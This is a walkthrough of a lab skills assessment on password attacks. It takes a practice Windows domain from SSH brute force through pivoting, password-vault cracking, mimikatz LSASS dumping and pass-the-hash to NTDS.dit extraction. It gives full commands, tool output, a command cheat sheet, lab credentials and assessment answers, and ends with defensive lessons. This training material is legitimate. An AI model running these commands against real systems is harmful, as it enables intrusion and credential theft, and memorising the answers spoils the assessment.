# Skills Assessment - Password Attacks Workflow

## 🎯 Overview

This **Skills Assessment** demonstrates a **complete penetration testing workflow** that combines multiple password attack techniques to achieve domain compromise. The scenario shows how individual techniques work together in a **real-world attack chain**.

> **"This walkthrough represents a practical implementation of password attack methodologies, from initial foothold to complete domain compromise."**

## 🏗️ Attack Chain Architecture

### Complete Workflow
```
Initial Recon → SSH Brute Force → Credential Hunting → Pivoting → Internal Enum → Share Analysis → Password Vault Cracking → Privilege Escalation → Domain Compromise
```

### Key Learning Objectives
- **Username enumeration** with username-anarchy
- **SSH brute forcing** with Hydra
- **Credential hunting** in bash history
- **Network pivoting** with ligolo-ng
- **Internal reconnaissance** with NetExec
- **Share credential hunting** with Snaffler
- **Password vault cracking** with hashcat
- **LSASS memory dumping** with mimikatz
- **Domain compromise** via NTDS.dit extraction

---

## 🔍 Phase 1: Initial Reconnaissance & Foothold

### Target Information
- **Target IP**: Single IP address provided
- **Known Information**: Betty Jayde (name), Texas123!@# (potential password)
- **Goal**: Gain initial access to the network

### Network Enumeration
```bash
# Initial port scan
nmap 10.129.234.116

# Result: Only SSH (port 22) is open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-11 08:41 CDT
Nmap scan report for 10.129.234.116
Host is up (0.0036s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
```

### Username Generation with Username-Anarchy

#### Installation and Setup
```bash
# Clone username-anarchy tool
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy

# Generate username variations for Betty Jayde
./username-anarchy Betty Jayde > user.list
```

#### Generated Username Patterns
```bash
# Common corporate patterns generated:
betty
bjayde
jayde
betty.jayde
jayde.betty
bettyjayde
jaydebet
b.jayde
betty_jayde
jbetty
```

### SSH Brute Force Attack

#### Hydra SSH Attack
```bash
# Brute force SSH with generated usernames and known password
hydra -L user.list -p 'Texas123!@#' ssh://10.129.234.116

# Expected output:
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 15 tasks per 1 server, overall 15 tasks, 15 login tries (l:15/p:1), ~1 try per task
[DATA] attacking ssh://10.129.234.116:22/
[22][ssh] host: 10.129.234.116   login: jbetty   password: Texas123!@#
1 of 1 target successfully completed, 1 valid password found
```

#### Successful SSH Access
```bash
# Connect with discovered credentials
ssh jbetty@10.129.234.116

# Result: Successfully logged into DMZ01 machine
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
jbetty@DMZ01:~$
```

---

## 🕵️ Phase 2: Credential Hunting

### Bash History Analysis
```bash
# Search for credentials in user directories
grep 'pass' -r /home/ 2>/dev/null

# Discovered credentials in bash history:
/home/jbetty/.bash_history:sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
/home/jbetty/.bash_history:passwd
```

### Extracted Credentials
- **Username**: hwilliam
- **Password**: dealer-screwed-gym1
- **Target**: file01 (internal network)

---

## 🌐 Phase 3: Network Pivoting

### Ligolo-ng Setup

#### Download and Extract
```bash
# On attack host - download ligolo-ng
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz

tar -xvzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
tar -xvzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
```

#### File Transfer Setup
```bash
# Start HTTP server on attack host
python3 -m http.server

# Download agent on DMZ01
jbetty@DMZ01:~$ wget http://ATTACK_IP:8000/agent
```

#### Proxy and Agent Setup
```bash
# Terminal 1: Start proxy on attack host
sudo ./proxy -selfcert

# Terminal 2: Connect agent from DMZ01
jbetty@DMZ01:~$ chmod +x ./agent
jbetty@DMZ01:~$ ./agent -connect ATTACK_IP:11601 --ignore-cert
```

#### Network Routing Configuration
```bash
# In ligolo-ng console:
ligolo-ng » session
? Specify a session : 1 - jbetty@DMZ01 - 10.129.234.116:35974

[Agent : jbetty@DMZ01] » autoroute
? Select routes to add: 172.16.119.13/24
? Create a new interface or use an existing one? Create a new interface
? Start the tunnel? Yes
```

---

## 🔍 Phase 4: Internal Network Reconnaissance

### Target Enumeration
```bash
# Create target list for internal network
cat << EOF > hosts
172.16.119.13
172.16.119.7
172.16.119.10
172.16.119.11
EOF
```

### Credential Validation with NetExec
```bash
# Test discovered credentials against internal targets
netexec rdp hosts -u hwilliam -p 'dealer-screwed-gym1'

# Results:
RDP         172.16.119.7    3389   JUMP01           [*] Windows 10 or Windows Server 2016 Build 17763 (name:JUMP01) (domain:nexura.htb) (nla:True)
RDP         172.16.119.10   3389   FILE01           [*] Windows 10 or Windows Server 2016 Build 17763 (name:FILE01) (domain:nexura.htb) (nla:True)
RDP         172.16.119.11   3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:nexura.htb) (nla:True)
RDP         172.16.119.7    3389   JUMP01           [+] nexura.htb\hwilliam:dealer-screwed-gym1 (Pwn3d!)
RDP         172.16.119.10   3389   FILE01           [+] nexura.htb\hwilliam:dealer-screwed-gym1
RDP         172.16.119.11   3389   DC01             [+] nexura.htb\hwilliam:dealer-screwed-gym1
```

### RDP Connection with File Sharing
```bash
# Connect to JUMP01 with shared folder
xfreerdp /v:172.16.119.7 /u:hwilliam /p:'dealer-screwed-gym1' /dynamic-resolution /drive:linux,.
```

---

## 📂 Phase 5: Network Share Analysis

### Share Enumeration
```bash
# Enumerate available shares
netexec smb hosts -u hwilliam -p 'dealer-screwed-gym1' --shares

# Key findings - FILE01 has interesting shares:
SMB         172.16.119.10   445    FILE01           Share           Permissions     Remark
SMB         172.16.119.10   445    FILE01           HR              READ,WRITE  
SMB         172.16.119.10   445    FILE01           IT                          
SMB         172.16.119.10   445    FILE01           MANAGEMENT                  
SMB         172.16.119.10   445    FILE01           PRIVATE         READ,WRITE  
SMB         172.16.119.10   445    FILE01           TRANSFER        READ,WRITE
```

### Snaffler Automated Credential Discovery

#### Tool Transfer and Execution
```bash
# Download Snaffler to attack host
wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.198/Snaffler.exe

# Copy via RDP shared folder to Windows Desktop
# Execute from RDP session:
C:\Users\hwilliam\Desktop\Snaffler.exe -u -s -n FILE01.nexura.htb
```

#### Snaffler Results
```cmd
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:06Z [Share] {Green}<\\FILE01.nexura.htb\HR>(R)
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:06Z [Share] {Green}<\\FILE01.nexura.htb\PRIVATE>(R)
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:06Z [Share] {Green}<\\FILE01.nexura.htb\TRANSFER>(R)

# Critical finding: Password vault discovered
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:07Z [File] {Black}<KeepPassMgrsByExtension|R|^\.psafe3$|1.1kB|2025-04-29 15:09:57Z>(\\FILE01.nexura.htb\HR\Archive\Employee-Passwords_OLD.psafe3) .psafe3
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:07Z [File] {Green}<KeepNameContainsGreen|R|passw|1.1kB|2025-04-29 15:09:57Z>(\\FILE01.nexura.htb\HR\Archive\Employee-Passwords_OLD.psafe3) Employee-Passwords_OLD.psafe3
```

---

## 🔓 Phase 6: Password Vault Cracking

### Password Safe File Extraction
```bash
# Connect to HR share and download the vault
smbclient -U nexura.htb\\hwilliam '\\172.16.119.10\HR'
# Password: dealer-screwed-gym1

smb: \> cd Archive
smb: \Archive\> get Employee-Passwords_OLD.psafe3
```

### Hashcat Password Vault Cracking

#### Identify Hash Mode
```bash
# Find appropriate hashcat mode for Password Safe v3
hashcat --example-hashes | grep -i safe -A 5

# Result: Mode 5200 - Password Safe v3
Name................: Password Safe v3
Category............: Password Manager
Slow.Hash...........: Yes
Password.Len.Min....: 0
Password.Len.Max....: 256
```

#### Crack Password Vault
```bash
# Crack with rockyou wordlist
hashcat -m 5200 Employee-Passwords_OLD.psafe3 /usr/share/wordlists/rockyou.txt.gz

# Result:
Employee-Passwords_OLD.psafe3:michaeljackson              
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
```

### Password Vault Access
```bash
# Access vault with cracked password: "michaeljackson"
# Contents revealed:
# - bdavid:caramel-cigars-reply1
# - stom:fails-nibble-disturb4
```

---

## ⚔️ Phase 7: Privilege Escalation

### Credential Validation
```bash
# Test new credentials against internal network
netexec winrm hosts -u bdavid -p 'caramel-cigars-reply1'

# Results:
WINRM       172.16.119.7    5985   JUMP01           [+] nexura.htb\bdavid:caramel-cigars-reply1 (Pwn3d!)
```

### Administrative Access via RDP
```bash
# Connect as administrator
xfreerdp /v:172.16.119.7 /u:bdavid /p:'caramel-cigars-reply1' /dynamic-resolution /drive:linux,.
```

### Mimikatz LSASS Dumping

#### Tool Transfer
```bash
# Copy mimikatz to attack host
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
# Transfer via RDP shared folder
```

#### Memory Credential Extraction
```cmd
# Run from elevated command prompt
C:\Users\bdavid\Desktop\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Key finding: NTLM hash for user 'stom'
Authentication Id : 0 ; 265194 (00000000:00040bea)
Session           : RemoteInteractive from 2
User Name         : stom
Domain            : NEXURA
        msv :
         [00000003] Primary
         * Username : stom
         * Domain   : NEXURA
         * NTLM     : 21ea958524cfd9a7791737f8d2f764fa
```

---

## 👑 Phase 8: Domain Compromise

### Pass-the-Hash Attack
```bash
# Test extracted NTLM hash against domain targets
netexec smb hosts -u stom -H 21ea958524cfd9a7791737f8d2f764fa

# Results:
SMB         172.16.119.10   445    FILE01           [+] nexura.htb\stom:21ea958524cfd9a7791737f8d2f764fa (Pwn3d!)
SMB         172.16.119.11   445    DC01             [+] nexura.htb\stom:21ea958524cfd9a7791737f8d2f764fa (Pwn3d!)
```

### NTDS.dit Extraction
```bash
# Extract domain controller database
netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa --ntds --user Administrator

# Results:
SMB         172.16.119.11   445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         172.16.119.11   445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:{ADMINISTRATOR_HASH}:::
```

---

## 🎯 Skills Assessment Questions

### Question 1: NEXURA\Administrator NTLM Hash
**Answer**: `{Extract from NTDS.dit output}`

**Methodology**:
1. ✅ Initial SSH brute force → jbetty:Texas123!@#
2. ✅ Credential hunting → hwilliam:dealer-screwed-gym1  
3. ✅ Network pivoting → Access to internal network
4. ✅ Share analysis → Password vault discovery
5. ✅ Vault cracking → bdavid credentials
6. ✅ Privilege escalation → mimikatz LSASS dump
7. ✅ Pass-the-Hash → stom account compromise
8. ✅ Domain compromise → NTDS.dit extraction

---

## 🔧 Tools Integration Summary

### Tools Used in Workflow
| Phase | Tool | Purpose | Alternative |
|-------|------|---------|-------------|
| **Recon** | username-anarchy | Username generation | Manual creation |
| **Initial** | Hydra | SSH brute force | NetExec ssh |
| **Hunting** | grep | Credential discovery | Manual file review |
| **Pivoting** | ligolo-ng | Network tunneling | Chisel, SSH tunnels |
| **Recon** | NetExec | Service enumeration | Nmap, custom scripts |
| **Shares** | Snaffler | Automated credential hunting | PowerHuntShares, manual |
| **Cracking** | hashcat | Password vault cracking | John the Ripper |
| **Memory** | mimikatz | LSASS credential extraction | pypykatz |
| **Domain** | NetExec | NTDS.dit extraction | secretsdump.py |

### Command Reference Quick Sheet
```bash
# Username generation
./username-anarchy FirstName LastName > users.txt

# SSH brute force
hydra -L users.txt -p 'Password123!' ssh://target

# Credential hunting
grep -r 'pass\|pwd\|cred' /home/ 2>/dev/null

# Internal enumeration  
netexec rdp targets.txt -u user -p password

# Share analysis
Snaffler.exe -u -s -n target.domain.com

# Password vault cracking
hashcat -m 5200 vault.psafe3 /usr/share/wordlists/rockyou.txt

# LSASS dumping
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Pass-the-Hash
netexec smb targets.txt -u user -H ntlm_hash

# NTDS extraction
netexec smb dc_ip -u user -H hash --ntds
```

---

## 💡 Key Learning Points

### Attack Chain Insights
1. **OSINT drives initial success** - Real names lead to valid usernames
2. **Credential reuse is common** - Users often reuse passwords across systems
3. **Network shares contain secrets** - IT environments accumulate credentials
4. **Password managers can be cracked** - Vaults often use weak master passwords
5. **Memory contains active credentials** - LSASS dumping reveals current sessions
6. **Hash attacks bypass passwords** - NTLM hashes work without plaintext
7. **Domain compromise = total control** - NTDS.dit contains every domain account

### Defensive Lessons
1. **Monitor authentication failures** - Detect brute force attempts
2. **Secure credential storage** - Use proper secrets management
3. **Network segmentation** - Prevent lateral movement
4. **Strong master passwords** - Protect password vaults adequately
5. **Memory protection** - Implement Credential Guard
6. **Privileged access controls** - Limit administrative account usage
7. **Domain controller hardening** - Protect NTDS.dit access

### Methodology Validation
- **Systematic approach** - Each phase builds on previous discoveries
- **Tool integration** - Multiple tools working together effectively
- **Real-world applicability** - Techniques mirror actual penetration tests
- **Complete coverage** - From foothold to domain admin
- **Practical skills** - Hands-on experience with industry tools

---

*This Skills Assessment demonstrates the complete password attacks workflow, combining reconnaissance, brute forcing, credential hunting, privilege escalation, and domain compromise techniques in a realistic penetration testing scenario.* 